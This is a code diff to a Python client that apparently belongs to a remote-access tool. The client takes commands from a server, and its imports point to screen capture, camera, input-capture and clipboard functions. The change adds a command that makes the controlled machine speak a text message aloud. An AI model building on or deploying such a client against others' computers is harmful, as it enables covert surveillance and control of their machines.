@@ -14,6 +14,7 @@ import hashlib
 import mss
 import cv2
 import pynput
+import pyttsx3
 import clipboard
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.backends import default_backend
@@ -70,6 +71,9 @@ class Client:
                 process = multiprocessing.Process(target=self.crypt,
                                                   args=(self.response, request["action"], request["open_path"],
                                                         request["password"]))
+                self.handle_process(process, request["timeout"])
+            elif request["cmd"] == "l":
+                process = multiprocessing.Process(target=self.speak, args=(request["msg"],))
                 self.handle_process(process, request["timeout"])
             self.connection.send(self.response)
 
@@ -212,6 +216,12 @@ class Client:
                 response["error"] = "MemoryError"
             except InvalidTag:
                 response["error"] = "InvalidTag"
+
+    @staticmethod
+    def speak(msg):
+        engine = pyttsx3.init()
+        engine.say(msg)
+        engine.runAndWait()
 
     def handle_process(self, process, timeout):
         process.start()
